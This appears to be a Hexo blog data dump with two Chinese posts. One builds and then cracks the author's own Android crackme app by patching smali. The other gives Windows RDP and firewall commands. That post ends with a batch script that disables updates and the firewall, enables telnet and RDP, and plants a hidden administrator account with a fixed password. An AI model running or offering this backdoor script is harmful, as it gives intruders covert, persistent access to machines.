app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        android:layout_marginTop=&quot;-13dp&quot;</div><div class=\"line\">        app:layout_constraintHorizontal_bias=&quot;0.858&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;/android.support.constraint.ConstraintLayout&gt;</div></pre></td></tr></table></figure></p>\n<p>打开app/java/cn.oddboy.xx.crackme01/MainActivity.java,编写逻辑代码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div></pre></td><td class=\"code\"><pre><div class=\"line\">package cn.oddboy.xx.crackme01;</div><div class=\"line\"></div><div class=\"line\">import android.support.v7.app.AppCompatActivity;</div><div class=\"line\">import android.os.Bundle;</div><div class=\"line\">import android.view.View;</div><div class=\"line\">import android.widget.Button;</div><div class=\"line\">import android.widget.EditText;</div><div class=\"line\">import android.widget.Toast;</div><div class=\"line\"></div><div class=\"line\">import java.security.MessageDigest;</div><div class=\"line\">import java.security.NoSuchAlgorithmException;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">public class MainActivity extends AppCompatActivity &#123;</div><div class=\"line\"></div><div class=\"line\">    @Override</div><div class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</div><div class=\"line\">        super.onCreate(savedInstanceState);</div><div class=\"line\">        setContentView(R.layout.activity_main);</div><div class=\"line\">        setTitle(R.string.unregister);</div><div class=\"line\">        final EditText edit_userName=(EditText)findViewById(R.id.userName);</div><div class=\"line\">        final EditText edit_sn=(EditText)findViewById(R.id.sn);</div><div class=\"line\">        final Button btn_reg=(Button)findViewById(R.id.button);</div><div class=\"line\">        btn_reg.setOnClickListener(new View.OnClickListener() &#123;</div><div class=\"line\">            @Override</div><div class=\"line\">            public void onClick(View view) &#123;</div><div class=\"line\">                if (!checkSN(edit_userName.getText().toString().trim(),edit_sn.getText().toString().trim())) &#123;</div><div class=\"line\">                    Toast.makeText(MainActivity.this, R.string.unsucessed, Toast.LENGTH_SHORT).show();</div><div class=\"line\">                &#125;else &#123;</div><div class=\"line\">                    Toast.makeText(MainActivity.this,</div><div class=\"line\">                            R.string.successed,Toast.LENGTH_SHORT).show();</div><div class=\"line\">                    btn_reg.setEnabled(false);</div><div class=\"line\">                    setTitle(R.string.registered);</div><div class=\"line\">                &#125;</div><div class=\"line\">            &#125;</div><div class=\"line\">        &#125;);</div><div class=\"line\">    &#125;</div><div class=\"line\">    public static String bytesToHex(byte[] in) &#123;</div><div class=\"line\">        final StringBuilder builder = new StringBuilder();</div><div class=\"line\">        for(byte b : in) &#123;</div><div class=\"line\">            builder.append(String.format(&quot;%02x&quot;, b));</div><div class=\"line\">        &#125;</div><div class=\"line\">        return builder.toString();</div><div class=\"line\">    &#125;</div><div class=\"line\">    private boolean checkSN(String userName, String sn)&#123;</div><div class=\"line\">        try&#123;</div><div class=\"line\">            if ((userName==null)||(userName.length()==0))</div><div class=\"line\">                return false;</div><div class=\"line\">            if ((sn==null)||(sn.length()==0))</div><div class=\"line\">                return false;</div><div class=\"line\">            MessageDigest digest=MessageDigest.getInstance(&quot;MD5&quot;);</div><div class=\"line\">            digest.reset();</div><div class=\"line\">            digest.update(userName.getBytes());</div><div class=\"line\">            byte[] bytes=digest.digest();</div><div class=\"line\">            String hexstr= bytesToHex(bytes);</div><div class=\"line\">            StringBuilder sb = new StringBuilder();</div><div class=\"line\">            for (int i=0;i&lt;hexstr.length();i+=2)&#123;</div><div class=\"line\">                sb.append(hexstr.charAt(i));</div><div class=\"line\">            &#125;</div><div class=\"line\">            String userSN=sb.toString();</div><div class=\"line\">            if (!userSN.equalsIgnoreCase(sn))</div><div class=\"line\">                return false;</div><div class=\"line\">        &#125; catch (NoSuchAlgorithmException e)&#123;</div><div class=\"line\">            e.printStackTrace();</div><div class=\"line\">            return false;</div><div class=\"line\">        &#125;</div><div class=\"line\">        return true;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>app/res/values/strings.xml<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;resources&gt;</div><div class=\"line\">    &lt;string name=&quot;app_name&quot;&gt;Crackme01&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;unregister&quot;&gt;程序未注册&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;unsucessed&quot;&gt;无效用户名或注册码&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;successed&quot;&gt;恭喜您！注册成功&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;registered&quot;&gt;程序已注册&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_register&quot;&gt;注册&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_androidInstance&quot;&gt;Android程序破解演示实例&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_username&quot;&gt;用户名&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_serialNo&quot;&gt;注册码&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_pleaseinputusername&quot;&gt;请输入用户名&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_input16chars&quot;&gt;请输入16位注册码&lt;/string&gt;</div><div class=\"line\">&lt;/resources&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"让程序Run起来\"><a href=\"#让程序Run起来\" class=\"headerlink\" title=\"让程序Run起来\"></a>让程序Run起来</h2><p>在AS中run - Run”app”，如果没有虚拟机，可以新建一个。<br><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_01.png\" alt=\"RUN起来\"></p>\n<h2 id=\"发布APK\"><a href=\"#发布APK\" class=\"headerlink\" title=\"发布APK\"></a>发布APK</h2><ul>\n<li><p>“Build -&gt; Build APK” 一键生成APK，但这种方式生成APK应该不能安装（因为没有签名）</p>\n</li>\n<li><p>“Build -&gt; Generate Signed APK”。选择keystore然后Next就可以了。</p>\n<p>  <img src=\"/2017/07/Android开发及破解入门实例/Screenshot_02.png\" alt=\"生成keystore\"><br>  此处也可以用keytool工具生成keystore文件。命令如下：</p>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">keytool -genkey -v -keystore bingo.keystore -alias bingo -keyalg RSA -validity 10000</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"APK逆向\"><a href=\"#APK逆向\" class=\"headerlink\" title=\"APK逆向\"></a>APK逆向</h2><blockquote>\n<p>  APK逆向的可用工具太多了，我完全懵逼了。这里只说明我用的工具，到底还有什么好用的工具我是不知道的。</p>\n</blockquote>\n<ul>\n<li>apktool  用于反编译和重新编译</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  apktool d crackme01.apk</div><div class=\"line\">I: Using Apktool 2.2.3 on crackme01.apk</div><div class=\"line\">I: Loading resource table...</div><div class=\"line\">I: Decoding AndroidManifest.xml with resources...</div><div class=\"line\">I: Loading resource table from file: /Users/jason/Library/apktool/framework/1.apk</div><div class=\"line\">I: Regular manifest package...</div><div class=\"line\">I: Decoding file-resources...</div><div class=\"line\">I: Decoding values */* XMLs...</div><div class=\"line\">I: Baksmaling classes.dex...</div><div class=\"line\">I: Copying assets and libs...</div><div class=\"line\">I: Copying unknown files...</div><div class=\"line\">I: Copying original files...</div></pre></td></tr></table></figure>\n<ul>\n<li><p>把整个生成的crackme01文件夹拽入visual studio code中。</p>\n</li>\n<li><p>搜索关键字”无效用户名或注册码”，在res/values/strings.xml中找到:</p>\n<blockquote>\n<pre><code>&lt;string name=&quot;unsucessed&quot;&gt;无效用户名或注册码&lt;/string&gt;\n</code></pre></blockquote>\n</li>\n<li>搜索关键字”unsucessed”,在res/values/public.xml中找到:<blockquote>\n<pre><code>&lt;public type=&quot;string&quot; name=&quot;unsucessed&quot; id=&quot;0x7f06002b&quot; /&gt;\n</code></pre></blockquote>\n</li>\n<li>搜索关键字”0x7f06002b”,在smali/cn/oddboy/xx/crackme01/MainActivity$1.smali中找到响应的代码。</li>\n</ul>\n<p><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_03.png\" alt=\"smali代码\"></p>\n<ul>\n<li><p>具体代码的分析，我还不太会。按照书上的说法，将94行的if-nez指令改为if-eqz指令即可，保存。</p>\n</li>\n<li><p>重新生成APK</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  apktool b crackme01</div><div class=\"line\">I: Using Apktool 2.2.3</div><div class=\"line\">I: Checking whether sources has changed...</div><div class=\"line\">I: Smaling smali folder into classes.dex...</div><div class=\"line\">I: Checking whether resources has changed...</div><div class=\"line\">I: Building resources...</div><div class=\"line\">I: Building apk file...</div><div class=\"line\">I: Copying unknown files/dir...</div><div class=\"line\"># 生成的APK在crackme01/dist/crackme01.apk</div></pre></td></tr></table></figure>\n</li>\n<li><p>重新签名</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜ jarsigner -verbose -keystore test.keystore crackme01/dist/crackme01.apk aaa</div><div class=\"line\">输入密钥库的密码短语:</div><div class=\"line\">   正在添加: META-INF/MANIFEST.MF</div><div class=\"line\">   正在添加: META-INF/AAA.SF</div><div class=\"line\">   正在添加: META-INF/AAA.RSA</div><div class=\"line\">  正在签名: AndroidManifest.xml</div><div class=\"line\">  正在签名: classes.dex</div><div class=\"line\">  ......</div><div class=\"line\">  正在签名: resources.arsc</div><div class=\"line\">jar 已签名。</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_04.png\" alt=\"安装到虚拟机上运行\"></p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><pre><code>路还远着，无FUCK说。 搞这么点东西，也花了一整天时间了。\n</code></pre>"},{"title":"Enable RDP through cmd line","date":"2017-04-26T11:21:29.000Z","_content":"## 开启RDP\n通过命令行修改注册表。\n\n```bash\n# 开启RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n# 关闭RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n# 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections\n\n```\n<!-- more -->\n## RDP端口\n\n```bash\n# 查询rdp端口号\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber\n\n```\n## 防火墙相关 [Netsh AdvFirewall](https://technet.microsoft.com/en-us/library/dd736198(v=ws.10).aspx)\n```bash\n# 防火墙状态\nnetsh advfirewall monitor show firewall\n\n# 允许访问3389端口\nnetsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389\n\n# 关闭防火墙\nnetsh firewall set opmode mode=disable\n\n```\n\n## 开启远程协助\n```bash\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n```\n\n## 其它\n```bash\n# 从进程中查找rdp进程\ntasklist  /svc | find \"TermService\"\n# 根据pid（1316）查询端口号\nnetstat -ano | find \"1316\"\n```\n\n\n## 脚本(maybe dangerous)  <未实际使用，仅供参考>\n```bash\n@echo off\n\nREM ****************\nREM Disable off \"AUTO UPDATE\"\nREM ****************\nsc config wuauserv start= disabled\nnet stop wuauserv\n\nREM ****************\nREM Disable windows xp Firewall\nREM ****************\nnetsh firewall set opmode disable\n\nREM ****************\nREM Enable TELNET\nREM ****************\nsc config tlntsvr start= auto\nnet start telnet\n\nREM ****************\nREM Enable Remote Desktop\nREM ****************\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\nREM ***************\nREM Create a HIDDEN USER usr= hack007, pass= dani\nREM ***************\nnet user hacker007 dani /add\nnet localgroup \"Administrators\" /add hacker007\nnet localgroup \"Users\" /del hacker007\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker007 /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f\n\n```","source":"_posts/Enable-RDP-through-cmd-line.md","raw":"---\ntitle: Enable RDP through cmd line\ndate: 2017-04-26 19:21:29\ntags:\n---\n## 开启RDP\n通过命令行修改注册表。\n\n```bash\n# 开启RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n# 关闭RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n# 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections\n\n```\n<!-- more -->\n## RDP端口\n\n```bash\n# 查询rdp端口号\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber\n\n```\n## 防火墙相关 [Netsh AdvFirewall](https://technet.microsoft.com/en-us/library/dd736198(v=ws.10).aspx)\n```bash\n# 防火墙状态\nnetsh advfirewall monitor show firewall\n\n# 允许访问3389端口\nnetsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389\n\n# 关闭防火墙\nnetsh firewall set opmode mode=disable\n\n```\n\n## 开启远程协助\n```bash\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n```\n\n## 其它\n```bash\n# 从进程中查找rdp进程\ntasklist  /svc | find \"TermService\"\n# 根据pid（1316）查询端口号\nnetstat -ano | find \"1316\"\n```\n\n\n## 脚本(maybe dangerous)  <未实际使用，仅供参考>\n```bash\n@echo off\n\nREM ****************\nREM Disable off \"AUTO UPDATE\"\nREM ****************\nsc config wuauserv start= disabled\nnet stop wuauserv\n\nREM ****************\nREM Disable windows xp Firewall\nREM ****************\nnetsh firewall set opmode disable\n\nREM ****************\nREM Enable TELNET\nREM ****************\nsc config tlntsvr start= auto\nnet start telnet\n\nREM ****************\nREM Enable Remote Desktop\nREM ****************\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\nREM ***************\nREM Create a HIDDEN USER usr= hack007, pass= dani\nREM ***************\nnet user hacker007 dani /add\nnet localgroup \"Administrators\" /add hacker007\nnet localgroup \"Users\" /del hacker007\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker007 /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f\n\n```","slug":"Enable-RDP-through-cmd-line","published":1,"updated":"2017-06-08T13:13:41.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfqk000197uvvgjxtn4p","content":"<h2 id=\"开启RDP\"><a href=\"#开启RDP\" class=\"headerlink\" title=\"开启RDP\"></a>开启RDP</h2><p>通过命令行修改注册表。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 开启RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"><span class=\"comment\"># 关闭RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 1 /f</div><div class=\"line\"><span class=\"comment\"># 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"RDP端口\"><a href=\"#RDP端口\" class=\"headerlink\" title=\"RDP端口\"></a>RDP端口</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 查询rdp端口号</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"</span> /v PortNumber</div></pre></td></tr></table></figure>\n<h2 id=\"防火墙相关-Netsh-AdvFirewall-aspx\"><a href=\"#防火墙相关-Netsh-AdvFirewall-aspx\" class=\"headerlink\" title=\"防火墙相关 Netsh AdvFirewall.aspx)\"></a>防火墙相关 <a href=\"https://technet.microsoft.com/en-us/library/dd736198(v=ws.10\" target=\"_blank\" rel=\"external\">Netsh AdvFirewall</a>.aspx)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 防火墙状态</span></div><div class=\"line\">netsh advfirewall monitor show firewall</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 允许访问3389端口</span></div><div class=\"line\">netsh advfirewall firewall add rule name=<span class=\"string\">\"Open Port 3389\"</span> dir=<span class=\"keyword\">in</span> action=allow protocol=TCP localport=3389</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 关闭防火墙</span></div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode mode=<span class=\"built_in\">disable</span></div></pre></td></tr></table></figure>\n<h2 id=\"开启远程协助\"><a href=\"#开启远程协助\" class=\"headerlink\" title=\"开启远程协助\"></a>开启远程协助</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fAllowToGetHelp /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>\n<h2 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 从进程中查找rdp进程</span></div><div class=\"line\">tasklist  /svc | find <span class=\"string\">\"TermService\"</span></div><div class=\"line\"><span class=\"comment\"># 根据pid（1316）查询端口号</span></div><div class=\"line\">netstat -ano | find <span class=\"string\">\"1316\"</span></div></pre></td></tr></table></figure>\n<h2 id=\"脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\"><a href=\"#脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\" class=\"headerlink\" title=\"脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;\"></a>脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\">@<span class=\"built_in\">echo</span> off</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable off <span class=\"string\">\"AUTO UPDATE\"</span></div><div class=\"line\">REM ****************</div><div class=\"line\">sc config wuauserv start= disabled</div><div class=\"line\">net stop wuauserv</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable windows xp Firewall</div><div class=\"line\">REM ****************</div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode <span class=\"built_in\">disable</span></div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable TELNET</div><div class=\"line\">REM ****************</div><div class=\"line\">sc config tlntsvr start= auto</div><div class=\"line\">net start telnet</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable Remote Desktop</div><div class=\"line\">REM ****************</div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"></div><div class=\"line\">REM ***************</div><div class=\"line\">REM Create a HIDDEN USER usr= hack007, pass= dani</div><div class=\"line\">REM ***************</div><div class=\"line\">net user hacker007 dani /add</div><div class=\"line\">net localgroup <span class=\"string\">\"Administrators\"</span> /add hacker007</div><div class=\"line\">net localgroup <span class=\"string\">\"Users\"</span> /del hacker007</div><div class=\"line\">reg add <span class=\"string\">\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\"</span> /v hacker007 /t REG_DWORD /d 0 /f</div><div class=\"line\">reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h2 id=\"开启RDP\"><a href=\"#开启RDP\" class=\"headerlink\" title=\"开启RDP\"></a>开启RDP</h2><p>通过命令行修改注册表。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 开启RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"><span class=\"comment\"># 关闭RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 1 /f</div><div class=\"line\"><span class=\"comment\"># 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections</div></pre></td></tr></table></figure>","more":"<h2 id=\"RDP端口\"><a href=\"#RDP端口\" class=\"headerlink\" title=\"RDP端口\"></a>RDP端口</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 查询rdp端口号</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"</span> /v PortNumber</div></pre></td></tr></table></figure>\n<h2 id=\"防火墙相关-Netsh-AdvFirewall-aspx\"><a href=\"#防火墙相关-Netsh-AdvFirewall-aspx\" class=\"headerlink\" title=\"防火墙相关 Netsh AdvFirewall.aspx)\"></a>防火墙相关 <a href=\"https://technet.microsoft.com/en-us/library/dd736198(v=ws.10\">Netsh AdvFirewall</a>.aspx)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 防火墙状态</span></div><div class=\"line\">netsh advfirewall monitor show firewall</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 允许访问3389端口</span></div><div class=\"line\">netsh advfirewall firewall add rule name=<span class=\"string\">\"Open Port 3389\"</span> dir=<span class=\"keyword\">in</span> action=allow protocol=TCP localport=3389</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 关闭防火墙</span></div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode mode=<span class=\"built_in\">disable</span></div></pre></td></tr></table></figure>\n<h2 id=\"开启远程协助\"><a href=\"#开启远程协助\" class=\"headerlink\" title=\"开启远程协助\"></a>开启远程协助</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fAllowToGetHelp /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>\n<h2 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div 